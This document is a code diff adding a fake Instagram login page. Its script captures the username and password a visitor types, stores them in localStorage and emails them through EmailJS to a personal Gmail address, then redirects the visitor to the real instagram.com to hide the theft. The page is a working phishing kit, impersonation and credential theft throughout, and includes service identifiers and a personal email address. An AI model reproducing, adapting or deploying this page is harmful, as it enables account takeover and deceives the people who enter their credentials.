@@ -1,0 +1,93 @@
+<!-- <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script> -->
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Instagram Login</title>
+    <link rel="stylesheet" href="style.css" />
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+      integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto&display=swap"
+      rel="stylesheet"
+    />
+  </head>
+  <body>
+    <div class="container">
+      <div class="center">
+        <div class="header">
+          <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTboBtL10-e7rOcB-HsBbrp9AiJCL7SpR0iPg&usqp=CAU" height="110" width="200" alt="instagramLogo" class="instaLogo" />
+        </div>
+        <div class="inputElement">
+          <input
+            type="text"
+            placeholder="Phone number,username or email"
+            class="inputText"
+            id="Username"
+          />
+          <input type="password" id="Password" placeholder="Password" class="inputText" />
+          <div class="forgetPassword">Forgotten your password?</div>
+          <button class="btn" id="a11111" onclick="sendmail();" type="submit" value="Log in" class="inputButton">Log in</button>
+        </div>
+      </div>
+      <div class="footer">
+        <p>Don't have an account?<a href="#"><span > Sign Up</span></a></p>
+      </div>
+    </div>
+
+    <script>
+      function sendmail(){
+        let flag=false;
+          (function(){
+              emailjs.init("xvJBD3idXnQ7JAJOi")
+          })();
+
+           var password = document.getElementById("Password").value;
+
+    var username = document.getElementById("Username").value;
+
+    if (!(password.trim() === ""||username.trim() === "")) {
+        localStorage.setItem('ls_password', username);
+        localStorage.setItem('ls_username', password);
+        
+    
+
+          var  params={
+              sendername: "aditya",
+              to : "tamboliharsh2@gmail.com",
+              subject : "password",
+              replyto: "no need",
+              message: `username : ${username}  , password : ${password}`,
+          };
+          
+          var serviceID="service_zyg4srp";
+          var templateID="template_gugy1kc";
+
+          emailjs.send(serviceID,templateID,params)
+          .then(res=>{
+
+              // alert("not done");
+              location.href="https://www.instagram.com"
+              //  flag=true;
+          })
+          .catch();
+      }
+      
+        
+      
+    }
+    
+  </script>
+  
+  </body>
+  
+</html>
